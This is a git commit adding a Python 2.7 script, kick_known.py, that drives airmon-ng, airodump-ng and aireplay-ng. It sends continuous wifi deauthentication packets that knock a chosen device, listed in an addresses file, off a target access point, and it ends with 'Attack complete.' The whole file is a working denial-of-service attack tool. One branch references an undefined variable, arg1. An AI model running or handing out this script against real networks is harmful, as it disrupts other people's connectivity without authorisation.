47c22d85a67423e0606498d4e93e746ac5ec3e31
rdav1es <65378317+rdav1es@users.noreply.github.com>
2020-05-16 01:39:38 +0100

    Add files via upload

---
+++ kick_known.py
@@ -0,0 +1,83 @@
+# Python 2.7 compatible, Linux only, ensure wireless interface is
+# is both capable of packet injection and is assigned to wlan0
+
+import os
+import sys
+import time
+
+table = {}
+test = False
+
+def startup():
+    print("")
+    print("Ensure the network interface is not in monitor mode. ")
+    choice = raw_input("Continue? Y/N: ")
+    os.system("xterm -e airmon-ng start wlan0")
+
+    while choice.lower() != "y" and choice.lower() != "n":
+        print("Invalid input. ")
+        choice = raw_input("Continue? Y/N: ")
+    if choice.lower() == "n":
+        sys.exit()
+
+def main():
+    table = {}
+    test = False
+    BSSID = "0:0:0:0:0"
+    file_name = "addresses.txt"
+
+    f = open(file_name,"r")
+    for line in f:
+        if line.rstrip():
+            line = line.rstrip()
+            line = line.replace(" ","")
+            line = line.split("=")
+            key = line[0]
+            data = line[1]
+            if key != "BSSID":
+                table[key] = data
+            else:
+                BSSID = data
+
+    print("")
+    for i in table.keys():
+        print(i)
+    print("")
+
+    target = raw_input("Please select a target from the above list. ")
+    if target not in table.keys():
+        print("Invalid response. ")
+        target = raw_input("Please select again. ")
+    print("")
+    timer = raw_input("Enter timeout length (seconds), -1 for infinite: ")
+
+    if timer == "-1":
+        print("")
+        print("Initializing...\n")
+        print("Targeting "+ target + " at address " + table[target])
+        print("Press ctlr+c to quit. ")
+        os.system(arg1)
+        time.sleep(1)
+        os.system("xterm -e aireplay-ng -0 0 -a " + BSSID + " -c " + table[target] + " -x 15 wlan0mon")
+    else:
+        while test != True:
+            try:
+                timer = int(timer)
+                a = timer + 1
+                test = True
+            except:
+                print("\nInvalid input. \n")
+                timer = raw_input("Enter timeout length (seconds), -1 for infinite: ")
+        timer = str(timer)
+        print("")
+        print("Initializing...\n")
+        print("Targeting " + target+ " at address " + table[target] + " for "+str(timer) + " seconds. ")
+        os.system("xterm -e timeout 5 airodump-ng -d " + BSSID + " -c 11 wlan0mon")
+        time.sleep(1)
+        os.system("xterm -e timeout " +timer+ " aireplay-ng -0 0 -a " + BSSID + " -c " +table[target]+ " -x 15 wlan0mon")
+        os.system("xterm -e airmon-ng stop wlan0mon")
+        time.sleep(1)
+        print("Attack complete. \n")
+        
+startup()
+main()
